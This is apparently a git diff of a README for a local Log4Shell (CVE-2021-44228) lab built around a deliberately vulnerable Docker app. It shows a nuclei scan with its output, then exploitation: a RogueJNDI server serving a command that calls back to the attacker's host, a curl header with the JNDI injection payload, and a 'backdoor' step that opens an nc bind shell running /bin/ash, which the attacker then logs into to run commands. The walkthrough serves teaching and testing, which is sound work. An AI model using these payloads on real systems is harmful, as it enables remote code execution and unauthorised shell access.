@@ -30,32 +30,10 @@ brew install maven
 
 ```bash
 docker build -f log4shell-vulnerable-app/Dockerfile -t vulnerable-app log4shell-vulnerable-app/.
-docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
+docker run -p 8080:8080 -p 3001:3001 --name vulnerable-app --rm vulnerable-app
 ```
 
-## Test the app
-
-Just run the following command. It will return "Hello, world!". Check the app's command line for error message. It will try to lookup the jndi server running on localhost port 1389.
-
-```bash
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://localhost:1389/a}'
-```
-
-```bash
-2022-02-06 11:13:28,611 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://localhost:1389/a]. javax.naming.CommunicationException: localhost:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
-        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
-        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
-```
-
-# Attack
-
-## Simple attack
-
-The JNDI Server (RogueJNDI) will run a JNDI server (port 1389) and a http server (8000). The JNDI Server will serve vulnerable code to be executed on the vulnerable-app. The http server is a backcall server for receiving calls sent from the vulnerable app.
-
-## Run the JNDI server
-
-get your local ip address (MacOS)
+## Get your local ip address (MacOS)
 
 ```bash
 # for ethernet
@@ -65,21 +43,89 @@ ipconfig getifaddr en1
 
 ```
 
+## Test app for vulnerability
+
+Build the docker container
+
+```bash
+docker build -f nuclei/Dockerfile -t nuclei nuclei/.
+```
+
+Now let's test if the server will tell us its hostname. Replace "your-private-ip" with the ip of your vulnerable app docker container
+
+```bash
+docker run -it --rm --entrypoint bin/ash nuclei
+nuclei -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://your-private-ip:8080
+```
+
+If the remote server is vulnerable to the log4shell bug, it will give you an output like following. The last element in the output (8dc4a6fbe91b) is the remote server's hostname.
+
+```bash
+$> nuclei -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://192.168.1.126:8080
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   2.6.0
+
+                projectdiscovery.io
+
+[WRN] Use with caution. You are responsible for your actions.
+[WRN] Developers assume no liability and are not responsible for any misuse or damage.
+[INF] Using Nuclei Engine 2.6.0 (latest)
+[INF] Using Nuclei Templates 8.8.4 (latest)
+[INF] Templates added in last update: 3030
+[INF] Templates loaded for scan: 1
+[INF] Using Interactsh Server: oast.live
+[2022-02-06 19:12:58] [CVE-2021-44228] [http] [critical] http://192.168.1.126:8080/ [62.2.17.166,8dc4a6fbe91b.xapiversion.c801rcpc7q5s72ri0tr0ceyb5pyyyyyyr.oast.live,xapiversion,8dc4a6fbe91b]
+```
+
+# Exploit the server
+
+Now let's run some command on the remote server.
+
+The JNDI Server (RogueJNDI) will run a JNDI server (port 1389) and a http server (8000). The JNDI Server will serve exploit code to be executed on the vulnerable-app. The http server is a backcall server for receiving calls sent from the vulnerable app.
+
+## Run the JNDI server
+
 ```bash
 cd rogue-jndi
 mvn compile package
-java -jar target/RogueJndi-1.1.jar -c "wget http://your-private-ip:8000 -H 'leak:$(JAVA_VERSION)'"
+java -jar target/RogueJndi-1.1.jar -c "wget http://your-private-ip:8000/callback/gugus"
 ```
 
 ## Issue simple attack
 
 ```bash
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/a/${env:JAVA_HOME}}'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
 ```
 
 ## Backdoor
 
-# Details
+Start the jndi server with the following command
+
+```bash
+java -jar target/RogueJndi-1.1.jar -c "nc -vv -l -p 3001 -e /bin/ash"
+```
+
+Start the nc server on the vulnerable app
+
+```bash
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
+```
+
+Login with nc
+
+```bash
+nc -v localhost 3001
+```
+
+Run some commands
+
+```
+ls
+uname -r
+```
 
 # References
 
